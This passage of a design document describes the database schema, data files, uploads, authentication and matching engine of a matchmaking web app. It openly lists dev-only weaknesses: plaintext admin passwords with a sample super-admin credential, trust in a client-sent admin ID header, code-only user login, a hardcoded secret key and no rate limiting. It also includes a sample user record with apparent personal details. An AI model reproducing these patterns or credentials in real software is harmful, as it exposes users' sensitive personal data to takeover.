| Column | Type | Nullable | Notes |
|---|---|---|---|
| `id` | Integer, PK | — | Autoincrement |
| `code` | String(20) | No, **unique** | Login credential, e.g. `USER7838`; generated by `generate_user_code()` |
| `full_name` | String(100) | No | Defaults to placeholder `متقدم جديد` until onboarding |
| `phone` | String(20) | Yes | |
| `email` | String(100) | Yes | |
| `birthday` | Date | Yes | Used to compute age in matching |
| `gender` | String(10) | Yes | `ذكر` (male) / `أنثى` (female) |
| `guardian_phone` | String(20) | Yes | Wali/guardian contact — Islamic matchmaking requirement |
| `guardian_relation` | String(50) | Yes | e.g. father, brother |
| `photo_path` | String(200) | Yes | Relative path/filename into `backend/uploads/` |
| `country` | String(50) | Yes | Free text (lowercase in practice, e.g. `qatar`) |
| `status` | String(20) | default `pending` | `pending` → `reviewing` → `approved` \| `rejected` |
| `status_reason` | Text | Yes | Admin-supplied reason on status change |
| `assigned_admin_id` | Integer, FK → `admins.id` | Yes | Which admin "owns" the case |
| `created_at` | DateTime | default `utcnow` | |
| `updated_at` | DateTime | default/onupdate `utcnow` | |

Relationships: `assigned_admin` (→ Admin), `mcq_answers` (1:1), `open_answers` (1:1), `notes` (1:many), `notifications` (1:many), `profile` (1:1) — **all with `cascade='all, delete-orphan'`**, so deleting a user cleans up every dependent row automatically except `activity_logs`, which uses `ondelete='SET NULL'` on `user_id` to preserve the audit trail after a user is deleted.

#### `user_profiles` — extended onboarding data (`UserProfile` model)
| Column | Type | Notes |
|---|---|---|
| `id` | Integer, PK | |
| `user_id` | Integer, FK → `users.id`, unique | 1:1 with `users` |
| `details` | **JSON** column | Free-form dict for one-question-at-a-time onboarding data not covered by fixed columns |
| `updated_at` | DateTime | onupdate `utcnow` |

This is the only column in the schema using SQLAlchemy's native JSON type (stored as serialized text inside SQLite) rather than a fixed set of typed columns — it exists to let onboarding collect flexible/extensible fields without a migration per new field.

#### `mcq_answers` — multiple-choice application answers (`MCQAnswer` model)
| Column | Type | Semantic meaning |
|---|---|---|
| `id` | Integer, PK | |
| `user_id` | Integer, FK → `users.id` | 1:1 with `users` |
| `q1` | String(50) | **Education level** — one of: ثانوي / دبلوم / بكالوريوس / ماجستير / دكتوراه |
| `q2` | String(50) | **Financial level** — one of: بسيط / متوسط / مرتفع / لا يهم |
| `q3` | String(50) | **Cross-country marriage preference** — نعم / لا / ليس مهماً |
| `q4` | String(50) | **Most important trait** — one of التدين / الأخلاق / المظهر / الثقافة / الاستقرار المالي |

`q1`/`q2` also drive the admin dashboard's `education`/`financial` server-side filters. `q3`/`q4` are used only by the matching engine (`matching_service.py`), not by admin filters.

#### `open_answers` — free-text essay answers (`OpenAnswer` model)
| Column | Type | Semantic meaning |
|---|---|---|
| `id` | Integer, PK | |
| `user_id` | Integer, FK → `users.id` | 1:1 with `users` |
| `q1` | Text | Self-description |
| `q2` | Text | Expectations of a partner |
| `q3` | Text | Vision for the future |
| `q4` | Text | Additional conditions |

Compared pairwise via keyword-overlap + length-ratio scoring in `matching_service.py` (`score_open_similarity`), always flagged `needs_manual_review: True` — it's a heuristic baseline, not a final decision.

#### `admins` — staff accounts (`Admin` model)
| Column | Type | Nullable | Notes |
|---|---|---|---|
| `id` | Integer, PK | — | |
| `full_name` | String(100) | No | |
| `phone` | String(20) | No | |
| `email` | String(100) | No, **unique** | Login identifier |
| `city` | String(50) | No | |
| `password_hash` | String(200) | No | Werkzeug-hashed (never plaintext in DB) |
| `is_super_admin` | Boolean | default `False` | Grants admin-management powers |
| `is_active` | Boolean | default `True` | Inactive admins are rejected at login and by `admin_required`/`super_admin_required` decorators |
| `created_at` | DateTime | default `utcnow` | |

#### `admin_notes` — case notes (`AdminNote` model)
| Column | Type | Notes |
|---|---|---|
| `id` | Integer, PK | |
| `user_id` | Integer, FK → `users.id` | |
| `admin_id` | Integer, FK → `admins.id` | Author |
| `note_text` | Text | |
| `is_visible_to_user` | Boolean, default `False` | `False` = internal-only; `True` = shown on applicant dashboard |
| `created_at` / `updated_at` | DateTime | |

#### `notifications` — in-app messages (`Notification` model)
| Column | Type | Notes |
|---|---|---|
| `id` | Integer, PK | |
| `user_id` | Integer, FK → `users.id`, nullable | Set when the notification targets an applicant |
| `admin_id` | Integer, FK → `admins.id`, nullable | Set when it targets an admin |
| `message` | Text | |
| `is_read` | Boolean, default `False` | |
| `created_at` | DateTime | |

#### `activity_logs` — audit trail (`ActivityLog` model)
| Column | Type | Notes |
|---|---|---|
| `id` | Integer, PK | |
| `admin_id` | Integer, FK → `admins.id` | Actor (required) |
| `user_id` | Integer, FK → `users.id`, `ondelete='SET NULL'` | Subject, survives user deletion as NULL |
| `action_type` | String(30) | e.g. `user_deleted`, `admin_created`, `note_added`, `status_changed`, `case_assigned` |
| `details` | Text, nullable | Free-text context (e.g. old code/name snapshot before delete) |
| `created_at` | DateTime | |

### 12.3 Entity-relationship summary

```
Admin (1) ──< assigned_users (User, many)      [assigned_admin_id]
Admin (1) ──< AdminNote (many)                 [author]
Admin (1) ──< Notification (many)              [recipient admin]
Admin (1) ──< ActivityLog (many)               [actor]

User (1) ──1 UserProfile                        [cascade delete]
User (1) ──1 MCQAnswer                          [cascade delete]
User (1) ──1 OpenAnswer                         [cascade delete]
User (1) ──< AdminNote (many)                    [cascade delete]
User (1) ──< Notification (many)                 [cascade delete]
User (1) ──< ActivityLog (many)                  [user_id → SET NULL on delete, log row survives]
```

### 12.4 JSON mirror files — exact shapes

**`backend/data/users.json`** — array of flat objects, one per user (note: real file has drifted slightly — some early rows include `id`, later ones omit it and use `code` as the natural key for re-seed matching):
```json
{
  "id": 1,
  "code": "USER7838",
  "full_name": "Fatima Al-Kuwari",
  "phone": "3370229",
  "email": "gkfnmii@gmail.com",
  "birthday": "2007-01-07",
  "gender": "أنثى",
  "guardian_phone": "2353244",
  "guardian_relation": "hf",
  "photo_path": "",
  "country": "qatar",
  "status": "reviewing",
  "status_reason": "",
  "assigned_admin_id": null,
  "created_at": "2026-07-30 03:58:18"
}
```
Does **not** include `mcq_answers`/`open_answers` unless explicitly nested by the sync helper — `app.py`'s `seed_users_from_json()` will read nested `mcq_answers`/`open_answers` keys if present on re-seed.

**`backend/data/admins.json`**:
```json
{
  "super_admin": { "full_name": "...", "phone": "...", "email": "super@wefaq.com", "city": "...", "password": "SuperAdmin@2026" },
  "admins": [ { "full_name": "...", "phone": "...", "email": "...", "city": "...", "password": "..." } ]
}
```
Passwords here are **plaintext**, written only at admin-create time by `sync_admin_to_json(admin, plain_password=...)` — used purely to reseed the DB hash on a fresh boot, mirroring the seed style. This is explicitly called out in the codebase as not production-safe (see 12.6).

**`backend/data/questions.json`**:
```json
{
  "mcq": [ { "id": 1, "question": "...", "options": ["...", "..."] } ],
  "open": ["essay prompt 1", "essay prompt 2", "essay prompt 3", "essay prompt 4"]
}
```
`mcq[i].id` maps to `MCQAnswer.q{id}`; `open` array index+1 maps to `OpenAnswer.q{index+1}`.

### 12.5 File uploads (photos)

- Directory: `backend/uploads/` (created at boot via `os.makedirs`, overridable with `WEFAQ_UPLOAD_DIR`).
- Filenames are randomized (observed as 32-char hex + original extension, e.g. `2eb82b133000430da0a6be9af1beaea4.jpg`) — not user-controlled, avoiding path traversal / overwrite issues.
- Allowed extensions enforced server-side: `{jpg, jpeg, png, webp}` (`ALLOWED_PHOTO_EXTENSIONS` in `config.py`).
- `User.photo_path` stores the reference back to the file; empty string when no photo uploaded.

### 12.6 Auth, hashing & data-sensitivity model

- **Admin passwords**: hashed with Werkzeug (`hash_password`/`verify_password` in `utils.py`) before being stored in `admins.password_hash`. Never stored in plaintext in the DB.
- **User "login"**: not password-based — applicants authenticate with the unique `code` string only (`GET`/`POST` flows check `X-User-Code` header or `code` body field via `security.py`'s `get_user_by_code`).
- **No server-side sessions/JWT**: the frontend holds `localStorage.wefaq_user` / `localStorage.wefaq_admin` and re-sends identifying info (`X-Admin-Id` header or `admin_id` in query/body; `X-User-Code` header or `code` in body) on every request. `security.py` centralizes this into `admin_required`, `super_admin_required`, `can_read_user`, `require_user_self`, `can_access_notification` decorators/helpers.
- **Input sanitation**: `security.py` defines caps — `MAX_NAME_LEN=100`, `MAX_PHONE_LEN=20`, `MAX_EMAIL_LEN=50`, `MAX_NOTE_LEN=2000`, `MAX_TEXT_LEN=5000`, `MIN_ADMIN_PASSWORD_LEN=8` — and `sanitize_text()` strips null bytes and truncates.
- **Known non-production-grade points** (explicitly by design for this dev/demo stage): plaintext passwords mirrored into `admins.json` for reseeding; `SECRET_KEY` is a hardcoded placeholder in `config.py`; CORS defaults to `*`; no rate limiting on the code-login endpoint.

### 12.7 Data flow at runtime

```
App boot (backend/app.py: create_app)
  → db.create_all()                      # creates any missing tables, never drops existing
  → seed_super_admin()                   # admins.json["super_admin"] → Admin row if email absent
  → seed_users_from_json()               # users.json entries whose code is absent → new User rows
                                          #   (+ nested mcq_answers/open_answers if present in JSON)

Every write path (generate-code, register, complete, answers, profile update, status change, assign)
  → SQLAlchemy commit to wefaq.db
  → sync_user_to_json() / sync_admin_to_json()   # mirrors the row into backend/data/*.json
  → log_activity() on admin-initiated actions    # ActivityLog row (audit trail)
```

**Resetting the DB in development:** delete `backend/instance/wefaq.db` and restart the app. `db.create_all()` recreates the schema from `models.py`, then both seed functions repopulate from the JSON mirrors — so the JSON files act as the effective "backup" of last resort. This is also the required step whenever a column is added to `models.py`, since SQLAlchemy's `create_all()` does not run migrations.

### 12.8 Matching engine's use of the data (read-only consumer)

`backend/services/matching_service.py` and `backend/routes/matching_routes.py` (`/api/admin/users/<id>/matches`, `/api/admin/matches/pair`) never write to the DB — they read `User`, `MCQAnswer`, `OpenAnswer` rows and compute a 0–100 compatibility score for admin review:
- **Eligibility (30 pts)**: opposite gender required (mandatory gate), same/compatible country (10 pts), age-gap scoring (10 pts).
- **MCQ similarity (40 pts)**: per-question scoring across education, financial level, cross-country preference, most-important-trait (`q1`–`q4`, 10 pts each).
- **Open-answer similarity (30 pts)**: Arabic-aware keyword-overlap + length-ratio heuristic per essay question; always flagged for manual admin review.

This confirms the MCQ/open-answer columns are dual-purpose: admin filtering (`q1`/`q2`) plus matching engine input (`q1`–`q4` on both tables).
